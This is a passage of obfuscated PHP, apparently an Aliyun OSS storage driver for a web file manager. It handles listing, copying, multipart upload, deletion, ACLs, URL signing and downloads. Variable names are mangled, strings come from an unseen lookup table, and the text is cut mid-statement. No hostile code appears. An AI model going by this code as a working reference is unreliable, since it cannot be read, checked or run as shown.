$öøìÍñš =& $_SERVER[ÏÒ Ì„]; $Ø´’·º = $this->getBucketCors(); if (!$Ø´’·º || !is_array($Ø´’·º)) { return !1; } if ($Ø´’·º[$öøìÍñš[181]] != $öøìÍñš[182] || $Ø´’·º[$öøìÍñš[183]] != $öøìÍñš[182]) { return !1; } $ìÅß‰›º = array_map($öøìÍñš[184], $Ø´’·º[$öøìÍñš[185]]); if (!is_array($ìÅß‰›º)) { $ìÅß‰›º = array(); } $€ùñŠ¬¾ = array($öøìÍñš[186], $öøìÍñš[187], $öøìÍñš[188], $öøìÍñš[189], $öøìÍñš[190]); $æ¬¾÷€„ = array_diff($€ùñŠ¬¾, $ìÅß‰›º); return empty($æ¬¾÷€„); } public function mkfile($«¬”‚Â, $¯ü—ïÊ = '', $çö¾¿ñ = REPEAT_RENAME) { $à×Ø‚×Á = $this->setContent($«¬”‚Â, $¯ü—ïÊ); if ($à×Ø‚×Á !== !1) { return $this->getPathOuter($«¬”‚Â); } return !1; } public function mkdir($‹³ü€ë¸, $±ÇÚÎ­€ = REPEAT_SKIP) { if ($this->_isFolder($‹³ü€ë¸)) { return $this->getPathOuter($‹³ü€ë¸); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($‹³ü€ë¸)); } catch (OSS\Core\OssException $ğ‡ğ½î¢) { return !1; } return $this->getPathOuter($‹³ü€ë¸); } private function fileList($ª©…é—â, $¶¤ÆíÒ¾ = '', $Â‘ÉšÇ = 0) { $é¨â¿İ =& $_SERVER[ÏÒ Ì„]; $ª©…é—â = trim($ª©…é—â, $é¨â¿İ[8]); $ŒşÜ«èì = empty($ª©…é—â) && $ª©…é—â !== $é¨â¿İ[191] ? $é¨â¿İ[33] : $ª©…é—â . $é¨â¿İ[8]; $¯›‘Ô‚ò = $é¨â¿İ[33]; $Œ››ëƒ = 1000; $Šü¼³Ÿ‰ = $this->listItemCache === !1 ? !1 : !0; $Ñ¬£æöê = $ÊËóØ† = array(); while (!0) { check_abort(); $Ö²®à¶‘ = array($é¨â¿İ[1319] => $¶¤ÆíÒ¾, $é¨â¿İ[1320] => $ŒşÜ«èì, $é¨â¿İ[1321] => $Œ››ëƒ, $é¨â¿İ[1322] => $¯›‘Ô‚ò); try { $¬ÈºŞá½ = $this->client->listObjects($this->bucket, $Ö²®à¶‘); } catch (OSS\Core\OssException $ÚÁãòß¢) { break; } $¯›‘Ô‚ò = $¬ÈºŞá½->getNextMarker(); $ìéş¸×ğ = $¬ÈºŞá½->getObjectList(); $õúá¼§‹ = $¬ÈºŞá½->getPrefixList(); foreach ($ìéş¸×ğ as $³Ğ•Ç™ï) { if ($³Ğ•Ç™ï->getKey() == $ŒşÜ«èì) { continue; } $¯òÁ‘ = $³Ğ•Ç™ï->getKey(); $ è¬» = $³Ğ•Ç™ï->getSize(); $Ù‡ÑÖèÜ = $³Ğ•Ç™ï->getLastModified(); $ıÅÆ§‡Œ = $Â‘ÉšÇ ? array($é¨â¿İ[28] => $¯òÁ‘, $é¨â¿İ[78] => $ è¬», $é¨â¿İ[197] => strtotime($Ù‡ÑÖèÜ)) : $¯òÁ‘; $°îáªû³ = $ è¬» == 0 && substr($¯òÁ‘, strlen($¯òÁ‘) - 1, 1) == $é¨â¿İ[8] ? !0 : !1; if ($Šü¼³Ÿ‰) { $this->cacheMethod($é¨â¿İ[199], $¯òÁ‘, $°îáªû³); $this->cacheMethod($é¨â¿İ[200], $¯òÁ‘, array($é¨â¿İ[78] => $ è¬», $é¨â¿İ[1323] => $ è¬», $é¨â¿İ[84] => strtotime($Ù‡ÑÖèÜ), $é¨â¿İ[1324] => $Ù‡ÑÖèÜ)); } if ($°îáªû³) { $Ñ¬£æöê[] = $¯òÁ‘; continue; } $ÊËóØ†[] = $ıÅÆ§‡Œ; } foreach ($õúá¼§‹ as $á¢åàğ) { $Ñ¬£æöê[] = $á¢åàğ->getPrefix(); if ($Šü¼³Ÿ‰) { $this->cacheMethod($é¨â¿İ[199], $¯òÁ‘, !0); } } if ($¯›‘Ô‚ò === $é¨â¿İ[33]) { break; } } if ($Šü¼³Ÿ‰) { $this->cacheMethod($é¨â¿İ[199], $ª©…é—â, !0); } return array($é¨â¿İ[75] => $Ñ¬£æöê, $é¨â¿İ[74] => $ÊËóØ†); } public function copyFile($áÚšÚ×´, $¾ñ×ğ¢º) { $ªõ¶²§ã = $this->size($áÚšÚ×´); if ($ªõ¶²§ã < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $áÚšÚ×´, $this->bucket, $this->pathEncode($¾ñ×ğ¢º)); } catch (OSS\Core\OssException $ıŠ³æÒ¨) { return !1; } return $this->getPathOuter($¾ñ×ğ¢º); } $êïå‚™è = $this->multiCopyObject($áÚšÚ×´, $¾ñ×ğ¢º, $ªõ¶²§ã); return $êïå‚™è ? $this->getPathOuter($¾ñ×ğ¢º) : !1; } private function multiCopyObject($‚Â¸×‘, $î¸«Úõû, $¨‰ìğò–) { $•±Øœ­Ø =& $_SERVER[ÏÒ Ì„]; try { $¼şæëÑ¦ = array(); if ($ÚëìíÁ¥ = $this->hashMd5($‚Â¸×‘)) { $¼şæëÑ¦ = array(OSS\OssClient::OSS_HEADERS => array($•±Øœ­Ø[1325] => $ÚëìíÁ¥)); } $Ä¼—·Ğ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($î¸«Úõû), $¼şæëÑ¦); $Š€Ì‘“Ú = 1; $ÂÎ‘‹…¹ = 0; $†Üó‘¾ = array(); $ñõ‚˜¨ğ = 1024 * 1024 * 10; $ó±ùÎÀ£ = $this->client->generateMultiuploadParts($¨‰ìğò–, $ñõ‚˜¨ğ); foreach ($ó±ùÎÀ£ as $×é«‰€ => $¿ë•Š§Í) { $ñšˆúó = $ÂÎ‘‹…¹ + (int) $¿ë•Š§Í[$•±Øœ­Ø[1326]]; $ı»ƒ½Ş” = (int) $¿ë•Š§Í[$•±Øœ­Ø[335]] + $ñšˆúó - 1; $¼åéÑ£… = array($•±Øœ­Ø[1327] => $ñšˆúó, $•±Øœ­Ø[1328] => $ı»ƒ½Ş”); $†Üó‘¾[] = $this->client->uploadPartCopy($this->bucket, $‚Â¸×‘, $this->bucket, $this->pathEncode($î¸«Úõû), $Š€Ì‘“Ú, $Ä¼—·Ğ, $¼åéÑ£…); $Š€Ì‘“Ú = $Š€Ì‘“Ú + 1; } $æ‰»œÆí = array(); foreach ($†Üó‘¾ as $×é«‰€ => $öäó“—) { $æ‰»œÆí[] = array($•±Øœ­Ø[1329] => $×é«‰€ + 1, $•±Øœ­Ø[1330] => $öäó“—); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($î¸«Úõû), $Ä¼—·Ğ, $æ‰»œÆí); } catch (OSS\Core\OssException $‚Êüê) { return !1; } return !0; } public function moveFile($Ç¥ªĞÌò, $ˆëÎ¿½Ë) { if ($this->copyFile($Ç¥ªĞÌò, $ˆëÎ¿½Ë)) { $this->remove($Ç¥ªĞÌò); return $this->getPathOuter($ˆëÎ¿½Ë); } return !1; } public function delFile($ôÙÊí–) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ôÙÊí–)); } catch (OSS\Core\OssException $Çó±¢Ç´) { return !1; } return !0; } public function delFolder($¢ß˜˜ö†) { $ºçÕ¯š· =& $_SERVER[ÏÒ Ì„]; if (!$this->exist($¢ß˜˜ö†)) { return !0; } $this->listItemCache = !1; $ìÜ«ˆ×è = $this->fileList($¢ß˜˜ö†); $this->listItemCache = !0; $Å¼´÷È² = trim($¢ß˜˜ö†, $ºçÕ¯š·[8]) . $ºçÕ¯š·[8]; if (!empty($¢ß˜˜ö†) && $¢ß˜˜ö† !== $ºçÕ¯š·[191] && !in_array($Å¼´÷È², $ìÜ«ˆ×è[$ºçÕ¯š·[75]])) { $ìÜ«ˆ×è[$ºçÕ¯š·[75]][] = $Å¼´÷È²; } $°“ñ„‘’ = $this->delByBatch($ìÜ«ˆ×è[$ºçÕ¯š·[74]]); if (!$°“ñ„‘’) { return !1; } $°“ñ„‘’ = $this->delByBatch($ìÜ«ˆ×è[$ºçÕ¯š·[75]]); if (!$°“ñ„‘’) { return !1; } return $this->delFile($Å¼´÷È²); } private function delByBatch($ÍÌÓû±İ) { foreach (array_chunk($ÍÌÓû±İ, 1000) as $ëŞú¼ı) { try { $this->client->deleteObjects($this->bucket, $ëŞú¼ı); } catch (OSS\Core\OssException $¸“ÁñÄò) { return !1; } } return !0; } public function rename($Š—­ØğÕ, $¶©¡ë‚Ö) { return $this->renameObject($Š—­ØğÕ, $¶©¡ë‚Ö); } private function fileInfo($Ü˜¹¶¶, $•Ô˜“‹Õ = false, $€µ…ØßÊ = array()) { $ÉŸÅêØõ =& $_SERVER[ÏÒ Ì„]; $××’Éæø = array($ÉŸÅêØõ[28] => $this->pathThis($Ü˜¹¶¶), $ÉŸÅêØõ[76] => $this->getPathOuter($Ü˜¹¶¶), $ÉŸÅêØõ[29] => $ÉŸÅêØõ[193], $ÉŸÅêØõ[78] => isset($€µ…ØßÊ[$ÉŸÅêØõ[78]]) ? $€µ…ØßÊ[$ÉŸÅêØõ[78]] : 0, $ÉŸÅêØõ[168] => $this->ext($Ü˜¹¶¶)); if ($•Ô˜“‹Õ) { return $××’Éæø; } $××’Éæø[$ÉŸÅêØõ[194]] = $××’Éæø[$ÉŸÅêØõ[84]] = 0; $××’Éæø[$ÉŸÅêØõ[195]] = $××’Éæø[$ÉŸÅêØõ[196]] = !0; if (empty($€µ…ØßÊ)) { $É„…¸Ü© = $this->objectMeta($Ü˜¹¶¶); if (!$É„…¸Ü©) { return $××’Éæø; } $€µ…ØßÊ = array($ÉŸÅêØõ[84] => strtotime($É„…¸Ü©[$ÉŸÅêØõ[1324]]), $ÉŸÅêØõ[78] => $É„…¸Ü©[$ÉŸÅêØõ[1323]] + 0); } if (isset($€µ…ØßÊ[$ÉŸÅêØõ[78]])) { $××’Éæø[$ÉŸÅêØõ[78]] = $€µ…ØßÊ[$ÉŸÅêØõ[78]]; } if (isset($€µ…ØßÊ[$ÉŸÅêØõ[84]])) { $××’Éæø[$ÉŸÅêØõ[84]] = $€µ…ØßÊ[$ÉŸÅêØõ[84]]; } if (isset($€µ…ØßÊ[$ÉŸÅêØõ[197]]) && !trim($××’Éæø[$ÉŸÅêØõ[84]])) { $××’Éæø[$ÉŸÅêØõ[84]] = $€µ…ØßÊ[$ÉŸÅêØõ[197]]; } return $××’Éæø; } private function folderInfo($à€Î‡Àå, $¹Ğñª‡ê = false, $ê°èôØŒ = array()) { $¢ÍŒƒÅ =& $_SERVER[ÏÒ Ì„]; $€§İÊ´¦ = array($¢ÍŒƒÅ[28] => $this->pathThis($à€Î‡Àå), $¢ÍŒƒÅ[76] => $this->getPathOuter($¢ÍŒƒÅ[8] . $à€Î‡Àå), $¢ÍŒƒÅ[29] => $¢ÍŒƒÅ[77]); if ($¹Ğñª‡ê) { return $€§İÊ´¦; } $€§İÊ´¦[$¢ÍŒƒÅ[194]] = $€§İÊ´¦[$¢ÍŒƒÅ[84]] = 0; $€§İÊ´¦[$¢ÍŒƒÅ[195]] = $€§İÊ´¦[$¢ÍŒƒÅ[196]] = !0; if (empty($ê°èôØŒ)) { $à€Î‡Àå = rtrim($à€Î‡Àå, $¢ÍŒƒÅ[8]) . $¢ÍŒƒÅ[8]; $†›‘ê¿× = $this->objectMeta($à€Î‡Àå); if (!$†›‘ê¿×) { return $€§İÊ´¦; } $ê°èôØŒ = array($¢ÍŒƒÅ[194] => $†›‘ê¿×[$¢ÍŒƒÅ[505]][$¢ÍŒƒÅ[1331]], $¢ÍŒƒÅ[84] => strtotime($†›‘ê¿×[$¢ÍŒƒÅ[1324]])); } if (isset($ê°èôØŒ[$¢ÍŒƒÅ[84]])) { $€§İÊ´¦[$¢ÍŒƒÅ[84]] = $ê°èôØŒ[$¢ÍŒƒÅ[84]]; } if (isset($ê°èôØŒ[$¢ÍŒƒÅ[194]])) { $€§İÊ´¦[$¢ÍŒƒÅ[194]] = $ê°èôØŒ[$¢ÍŒƒÅ[194]]; } return $€§İÊ´¦; } public function listPath($İ‚Ë¹ôä, $µÚâÖ— = false) { $¡‹ò¼Ÿ =& $_SERVER[ÏÒ Ì„]; $íá˜İêæ = $this->fileList($İ‚Ë¹ôä, $¡‹ò¼Ÿ[8], !0); foreach ($íá˜İêæ[$¡‹ò¼Ÿ[75]] as $Š”½ô¿Ğ => $á¦Şƒ·æ) { $íá˜İêæ[$¡‹ò¼Ÿ[75]][$Š”½ô¿Ğ] = $this->folderInfo($á¦Şƒ·æ, $µÚâÖ—, $á¦Şƒ·æ); } foreach ($íá˜İêæ[$¡‹ò¼Ÿ[74]] as $Š”½ô¿Ğ => $á¦Şƒ·æ) { $íá˜İêæ[$¡‹ò¼Ÿ[74]][$Š”½ô¿Ğ] = $this->fileInfo($á¦Şƒ·æ[$¡‹ò¼Ÿ[28]], $µÚâÖ—, $á¦Şƒ·æ); } return $íá˜İêæ; } public function has($•ëÌ–Ç, $Ã¯±ÊÕ© = false, $ßÛó¸µ = true) { $Ş ßõ­© =& $_SERVER[ÏÒ Ì„]; $•ëÌ–Ç = trim($•ëÌ–Ç, $Ş ßõ­©[8]); $îô»ğ®· = empty($•ëÌ–Ç) && $•ëÌ–Ç !== $Ş ßõ­©[191] ? $Ş ßõ­©[33] : $•ëÌ–Ç . $Ş ßõ­©[8]; $ª•‰×â = $Ş ßõ­©[33]; $³¡éÄ£ã = 500; $£İ­˜Éî = $çíûÈõ† = 0; while (!0) { check_abort(); $ÁèÎÙ²Ó = array($Ş ßõ­©[1319] => $Ş ßõ­©[8], $Ş ßõ­©[1320] => $îô»ğ®·, $Ş ßõ­©[1321] => $³¡éÄ£ã, $Ş ßõ­©[1322] => $ª•‰×â); try { $ŠóâÌµ© = $this->client->listObjects($this->bucket, $ÁèÎÙ²Ó); } catch (OSS\Core\OssException $ÈãÃŸ¶) { break; } $ª•‰×â = $ŠóâÌµ©->getNextMarker(); $á…ª²á = $ŠóâÌµ©->getObjectList(); $’Ò­Öş = $ŠóâÌµ©->getPrefixList(); if ($Ã¯±ÊÕ©) { if (count($á…ª²á) > 1 || count($á…ª²á) == 1 && $á…ª²á[0]->getKey() != $îô»ğ®·) { $£İ­˜Éî += count($á…ª²á) - 1; } if (!empty($’Ò­Öş)) { $çíûÈõ† += count($’Ò­Öş); } if ($ª•‰×â === $Ş ßõ­©[33]) { break; } continue; } if ($ßÛó¸µ) { if (!empty($á…ª²á)) { if (count($á…ª²á) > 1 || $á…ª²á[0]->getKey() != $îô»ğ®·) { return !0; } } } else { if (!empty($’Ò­Öş)) { return !0; } } if ($ª•‰×â === $Ş ßõ­©[33]) { break; } } if ($Ã¯±ÊÕ©) { return array($Ş ßõ­©[203] => $£İ­˜Éî, $Ş ßõ­©[204] => $çíûÈõ†); } return !1; } public function listAll($ó—Ñòô¨) { $ÀÍ³øà =& $_SERVER[ÏÒ Ì„]; $Î…€„òŸ = $this->fileList($ó—Ñòô¨, $ÀÍ³øà[33], !0); $‹ûŒ•ãÅ = array(); foreach ($Î…€„òŸ[$ÀÍ³øà[74]] as $•Íåôœß) { $‹ûŒ•ãÅ[$•Íåôœß[$ÀÍ³øà[28]]] = $•Íåôœß[$ÀÍ³øà[78]]; } foreach ($Î…€„òŸ[$ÀÍ³øà[75]] as $•Íåôœß) { if (is_string($•Íåôœß)) { $‹ûŒ•ãÅ[$•Íåôœß] = 0; } } return $this->listAllFiles($ó—Ñòô¨, array_keys($‹ûŒ•ãÅ), $‹ûŒ•ãÅ); } public function canRead($ñáˆ®½) { $Ó¨›¸Ë§ =& $_SERVER[ÏÒ Ì„]; $òÉÅ’Ùí = $this->pathAcl($ñáˆ®½); return $òÉÅ’Ùí == $Ó¨›¸Ë§[1332] || $òÉÅ’Ùí == $Ó¨›¸Ë§[544] ? !0 : !1; } public function canWrite($åÍÖ¤Ú) { $”Š«‡Á² = $this->pathAcl($åÍÖ¤Ú); return $”Š«‡Á² == $_SERVER[ÏÒ Ì„][544] ? !0 : !1; } public function pathAcl($—è»‰õ) { $Òú•ÇäÆ =& $_SERVER[ÏÒ Ì„]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Óşª¿û = $this->client->getObjectAcl($this->bucket, $this->pathEncode($—è»‰õ)); } catch (OSS\Core\OssException $ÎŠ°ò”ı) { return !1; } $£©¶ï = $Óşª¿û == $Òú•ÇäÆ[34] ? $this->bucketAcl : $Óşª¿û; if ($£©¶ï == $Òú•ÇäÆ[1333]) { return $Òú•ÇäÆ[1332]; } if ($£©¶ï == $Òú•ÇäÆ[1334]) { return $Òú•ÇäÆ[544]; } return $£©¶ï; } private function chmodPath($ªÑ¡°¹Ô, $¬š“óéş = '') { $—èÍîµ =& $_SERVER[ÏÒ Ì„]; $†Óè÷¨ = empty($¬š“óéş) ? $—èÍîµ[1334] : $¬š“óéş; $²¢Œğ§Ï = array($—èÍîµ[34], $—èÍîµ[192], $—èÍîµ[1333], $—èÍîµ[1334]); if (!in_array($†Óè÷¨, $²¢Œğ§Ï)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ªÑ¡°¹Ô), $†Óè÷¨); } catch (OSS\Core\OssException $÷Ï ê¸Í) { return !1; } return !0; } public function getContent($–ä–¬¨Ã) { return $this->fileSubstr($–ä–¬¨Ã, -1); } public function setContent($ùÄÄØÜ, $¢á–§Á– = '') { $“Ş²şÕô =& $_SERVER[ÏÒ Ì„]; try { $ªÉ‹ÅÏ = $this->trafficLimit($“Ş²şÕô[1335]); $Û¨ñğÌù = $this->client->putObject($this->bucket, $this->pathEncode($ùÄÄØÜ), $¢á–§Á–, $ªÉ‹ÅÏ); } catch (OSS\Core\OssException $íÌÕş“) { return !1; } $úÚ˜°ìà = array($“Ş²şÕô[1325] => trim($Û¨ñğÌù[$“Ş²şÕô[1336]], $“Ş²şÕô[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ùÄÄØÜ))); $this->updateObjMeta($ùÄÄØÜ, $úÚ˜°ìà); return isset($Û¨ñğÌù[$“Ş²şÕô[1337]][$“Ş²şÕô[1284]]) ? !0 : !1; } private function updateObjMeta($ áÑ¬âÕ, $éÑÅ„) { $ áÑ¬âÕ = $this->pathEncode($ áÑ¬âÕ); try { $”§í½©Ù = array(OSS\OssClient::OSS_HEADERS => $éÑÅ„); $this->client->copyObject($this->bucket, $ áÑ¬âÕ, $this->bucket, $ áÑ¬âÕ, $”§í½©Ù); } catch (OSS\Core\OssException $İÌÜíî) { return !1; } return !0; } public function upload($˜ö£¬ÏÓ, $ÏÆƒ í—, $¹¦µª¥ = false, $Şéâ•å = REPEAT_REPLACE) { $™Ò­£¥è =& $_SERVER[ÏÒ Ì„]; $éÛØÂ¦Ù = trim($˜ö£¬ÏÓ, $™Ò­£¥è[8]); $„»àœÊ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($™Ò­£¥è[1325] => @md5_file($ÏÆƒ í—)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($˜ö£¬ÏÓ))); $„»àœÊ = $this->trafficLimit($™Ò­£¥è[1335], $„»àœÊ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($éÛØÂ¦Ù), $ÏÆƒ í—, $„»àœÊ); } catch (OSS\Core\OssException $¯ñïÒ—ò) { return !1; } return $this->getPathOuter($˜ö£¬ÏÓ); } public function getHost() { $¬í¬Ú‰’ =& $_SERVER[ÏÒ Ì„]; $¿İ¨Æ‘¡ = explode($¬í¬Ú‰’[177], parent::getHost()); return $¿İ¨Æ‘¡[0] . $¬í¬Ú‰’[177] . $this->bucket . $¬í¬Ú‰’[95] . $¿İ¨Æ‘¡[1]; } public function uploadFormData($¯–»›Õş, $‘ÌÆíšÄ = 3600) { $éâñ³ô£ =& $_SERVER[ÏÒ Ì„]; if (!($ú©§¡Ã¬ = $this->getHost())) { return !1; } $ü´ˆì‚· = $‘ÌÆíšÄ; $ı£ûÔã = date($éâñ³ô£[1338], time() + $ü´ˆì‚·); $°é¤å¸ = new DateTime($ı£ûÔã); $æ°ĞŠ¤ = $°é¤å¸->format(DateTime::ISO8601); $ğÚ†ŸÍ  = strpos($æ°ĞŠ¤, $éâñ³ô£[294]); $æ°ĞŠ¤ = substr($æ°ĞŠ¤, 0, $ğÚ†ŸÍ ) . $éâñ³ô£[1339]; $ëüÖı = 1048576000 * 5; $È€öëÈÖ = $this->pathFather($¯–»›Õş); $Ú æëÎÑ = array($éâñ³ô£[1236] => $æ°ĞŠ¤, $éâñ³ô£[1237] => array(array($éâñ³ô£[1340], 0, $ëüÖı), array($éâñ³ô£[1240], $éâñ³ô£[1241], $È€öëÈÖ))); $í°éÉéÃ = base64_encode(json_encode($Ú æëÎÑ)); $ğµÚÂÖç = base64_encode(hash_hmac($éâñ³ô£[230], $í°éÉéÃ, $this->secret, !0)); $ìşÎâÎà = array($éâñ³ô£[1246] => $í°éÉéÃ, $éâñ³ô£[1341] => $this->accessKey, $éâñ³ô£[1242] => $éâñ³ô£[1234], $éâñ³ô£[1342] => $ğµÚÂÖç, $éâñ³ô£[175] => $ú©§¡Ã¬); $ìşÎâÎà = $this->trafficLimit($éâñ³ô£[1335], $ìşÎâÎà); return $ìşÎâÎà; } public function multiUploadFormData($×—„Ş‹, $¡ÔûŠ¢Â = 3600) { $ºË·´‰Ö =& $_SERVER[ÏÒ Ì„]; if (!($äç¹¨º© = $this->getHost())) { return !1; } $ƒŸîğğ = $this->trafficLimit($ºË·´‰Ö[1335]); $ ”Ÿøı = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($×—„Ş‹), $ƒŸîğğ); return array($ºË·´‰Ö[221] => $ ”Ÿøı, $ºË·´‰Ö[175] => $äç¹¨º© . $ºË·´‰Ö[8] . $this->pathEncode($×—„Ş‹), $ºË·´‰Ö[222] => gmdate($ºË·´‰Ö[1343]), $ºË·´‰Ö[93] => $×—„Ş‹); } public function multiUploadAuthData($šèßÙ¾Ó, $®Ÿ×‡• = array()) { $å…î¾Õ =& $_SERVER[ÏÒ Ì„]; $×€ğãœ  = isset($®Ÿ×‡•[$å…î¾Õ[222]]) ? $®Ÿ×‡•[$å…î¾Õ[222]] : gmdate($å…î¾Õ[1343]); $¦Ç„ó©¢ = isset($®Ÿ×‡•[$å…î¾Õ[168]]) ? $®Ÿ×‡•[$å…î¾Õ[168]] : $å…î¾Õ[33]; $„á¦Òû = $šèßÙ¾Ó; if (isset($®Ÿ×‡•[$å…î¾Õ[93]])) { $„á¦Òû = $®Ÿ×‡•[$å…î¾Õ[93]]; unset($®Ÿ×‡•[$å…î¾Õ[93]]); } if (isset($®Ÿ×‡•[$å…î¾Õ[223]])) { $®Ÿ×‡•[$å…î¾Õ[222]] = $×€ğãœ ; return $this->listUploadParts($„á¦Òû, $®Ÿ×‡•); } $‚¿Ô©“ = array($å…î¾Õ[224], $å…î¾Õ[33], $å…î¾Õ[119], $×€ğãœ , "\170\55\x6f\x73\x73\55\x64\x61\164\x65\x3a{$×€ğãœ }", $å…î¾Õ[8] . $this->bucket . $å…î¾Õ[8] . $„á¦Òû . $¦Ç„ó©¢); if (strpos($¦Ç„ó©¢, $å…î¾Õ[225]) === 0) { $‚¿Ô©“[0] = $å…î¾Õ[226]; if ($°¡•Õ’ = $this->trafficLimit($å…î¾Õ[1335])) { $„á¦Òû = $å…î¾Õ[1344]; array_splice($‚¿Ô©“, 5, 0, $„á¦Òû . $å…î¾Õ[4] . $°¡•Õ’[$„á¦Òû]); } } if (isset($®Ÿ×‡•[$å…î¾Õ[227]]) && $®Ÿ×‡•[$å…î¾Õ[227]] == $å…î¾Õ[228]) { $‚¿Ô©“[0] = $å…î¾Õ[228]; } if (!empty($®Ÿ×‡•[$å…î¾Õ[1345]])) { $¡¿ôêè = array_merge(array($‚¿Ô©“[4]), $®Ÿ×‡•[$å…î¾Õ[1345]]); sort($¡¿ôêè); $‚¿Ô©“[4] = implode($å…î¾Õ[229], $¡¿ôêè); } $†˜ÒÅÊ = implode($å…î¾Õ[229], $‚¿Ô©“); $í·ÀùÑË = base64_encode(hash_hmac($å…î¾Õ[230], $†˜ÒÅÊ, $this->secret, !0)); $¿şïï˜ı = $å…î¾Õ[1309] . $this->accessKey . $å…î¾Õ[4] . $í·ÀùÑË; if (strpos($¦Ç„ó©¢, $å…î¾Õ[225]) === 0) { $¿şïï˜ı = array($å…î¾Õ[232] => $¿şïï˜ı, $å…î¾Õ[222] => $×€ğãœ ); if ($°¡•Õ’) { $¿şïï˜ı = array_merge($¿şïï˜ı, $°¡•Õ’); } } return $¿şïï˜ı; } public function listUploadParts($ªÅÕÙÖÒ, $ıôá‡Î) { $ƒó—¥© =& $_SERVER[ÏÒ Ì„]; $ÂÛ§’á = parse_url_query($ıôá‡Î[$ƒó—¥©[168]]); $Ş„…¿Áµ = $this->client->listParts($this->bucket, $this->pathEncode($ªÅÕÙÖÒ), $ÂÛ§’á[$ƒó—¥©[221]]); $˜¾–‚”ê = $Ş„…¿Áµ->getListPart(); $ìï÷Ü‹— = array(); foreach ($˜¾–‚”ê as $ ½â«) { $ìï÷Ü‹—[] = array($ƒó—¥©[1329] => $ ½â«->getPartNumber(), $ƒó—¥©[1330] => trim($ ½â«->getETag(), $ƒó—¥©[116])); } unset($ıôá‡Î[$ƒó—¥©[223]], $ıôá‡Î[$ƒó—¥©[227]]); $Ø—’Ïãò = $this->multiUploadAuthData($ªÅÕÙÖÒ, $ıôá‡Î); if (empty($Ø—’Ïãò)) { return !1; } return array($ƒó—¥©[232] => $Ø—’Ïãò, $ƒó—¥©[222] => $ıôá‡Î[$ƒó—¥©[222]], $ƒó—¥©[234] => $ìï÷Ü‹—); } public function download($ü©µÌñë, $³ÅÓ½Û”) { if ($this->isFolder($ü©µÌñë)) { return !1; } try { $–ˆ­²¥ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $³ÅÓ½Û”); $–ˆ­²¥ = $this->trafficLimit($_SERVER[ÏÒ Ì„][109], $–ˆ­²¥); $this->client->getObject($this->bucket, $this->pathEncode($ü©µÌñë), $–ˆ­²¥); } catch (OSS\Core\OssException $µ…ÎŸ—) { return !1; } return $³ÅÓ½Û”; } public function fileSubstr($°Êª–‚ş, $¹ÆùÍ· = 0, $·çÇ½Ï = false) { if ($¹ÆùÍ· === -1) { $êŸèâ = array(); } else { if ($·çÇ½Ï === !1) { $Ê°ËĞùø = $this->size($°Êª–‚ş); } else { $Ê°ËĞùø = $¹ÆùÍ· + $·çÇ½Ï - 1; } $êŸèâ = array(OSS\OssClient::OSS_RANGE => "{$¹ÆùÍ·}\55{$Ê°ËĞùø}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($°Êª–‚ş), $êŸèâ); } catch (OSS\Core\OssException $€´à°æé) { think_exception($€´à°æé->getMessage()); return !1; } } private function trafficLimit($¨Œîæ Á, $ à“¸•ß = array()) { $•¨ÀŒ‚ğ =& $_SERVER[ÏÒ Ì„]; if ($¨Œîæ Á == $•¨ÀŒ‚ğ[1335] && $this->isUploadServer() || $¨Œîæ Á == $•¨ÀŒ‚ğ[109] && $this->isFileOutServer()) { return $ à“¸•ß; } $„Ÿ»òŞ = floatval($GLOBALS[$•¨ÀŒ‚ğ[6]][$•¨ÀŒ‚ğ[88]][$•¨ÀŒ‚ğ[107]][$¨Œîæ Á]) * 1024 * 1024 * 8; if (!$„Ÿ»òŞ) { return $ à“¸•ß; } $„Ÿ»òŞ = $„Ÿ»òŞ < 819200 ? 819200 : ($„Ÿ»òŞ > 838860800 ? 838860800 : $„Ÿ»òŞ); $ à“¸•ß[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($„Ÿ»òŞ); return $ à“¸•ß; } public function link($µ±…úóË, $²½øÚ = array()) { $„ÇÛ…ˆÍ =& $_SERVER[ÏÒ Ì„]; if (!$this->exist($µ±…úóË) || $this->isFolder($µ±…úóË)) { return !1; } try { $²½øÚ = $this->trafficLimit($„ÇÛ…ˆÍ[109], $²½øÚ); $öêÍŠ¹˜ = $this->client->signUrl($this->bucket, $this->pathEncode($µ±…úóË), 3600 * 12, $„ÇÛ…ˆÍ[228], $²½øÚ); return $this->getCdnLink($öêÍŠ¹˜); } catch (OSS\Core\OssException $±ãıƒ½¬) { return !1; } } public function fileOut($»‡Ùó¯İ, $³”¬™Ò‰ = false, $ÀÛ€–¹¶ = false, $µŠ“„Â = '') { $ã¤ç¥’ =& $_SERVER[ÏÒ Ì„]; if ($this->isFileOutServer()) { return $this->fileOutServer($»‡Ùó¯İ, $³”¬™Ò‰, $ÀÛ€–¹¶, $µŠ“„Â); } if (!$ÀÛ€–¹¶) { $ÀÛ€–¹¶ = $this->pathThis($»‡Ùó¯İ); } $ÀÛ€–¹¶ = rawurlencode($ÀÛ€–¹¶); $úìÍÎ§û = get_file_mime(get_path_ext($ÀÛ€–¹¶)); if ($úìÍÎ§û == $ã¤ç¥’[213]) { return parent::fileOut($»‡Ùó¯İ, $³”¬™Ò‰, $ÀÛ€–¹¶, $µŠ“„Â); } $³”¬™Ò‰ = $³”¬™Ò‰ ? $ã¤ç¥’[214] : $ã¤ç¥’[215]; $²İ®ÁˆÚ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ã¤ç¥’[1346] . rawurlencode("{$³”¬™Ò‰}\x3b\146\x69\154\x65\156\141\x6d\145\x3d{$ÀÛ€–¹¶}")); $²İ®ÁˆÚ[OSS\OssClient::OSS_SUB_RESOURCE] .= $ã¤ç¥’[1347] . rawurlencode($úìÍÎ§û); $êÏ×¥ƒí = 